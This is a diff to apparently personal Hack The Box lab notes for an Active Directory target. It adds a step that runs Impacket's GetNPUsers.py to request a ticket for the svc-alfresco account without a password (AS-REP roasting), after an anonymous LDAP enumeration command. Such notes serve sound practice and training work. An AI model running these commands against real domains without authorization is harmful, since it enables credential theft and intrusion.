@@ -8,6 +8,13 @@ ldapsearch -x -H ldap://10.129.95.210 \
   -b "dc=htb,dc=local" \
   "(objectClass=*)"
 ```
+>[!NOTE]
+> Determine if service account or whatever account that is found needs authentication disabled
+> Request tgt using this command:
+```
+GetNPUsers.py htb.local/svc-alfresco -no-pass -dc-ip 10.129.95.210
+```
+
 # Internal 
 >[!NOTE]
 > Import ActiveDirectory
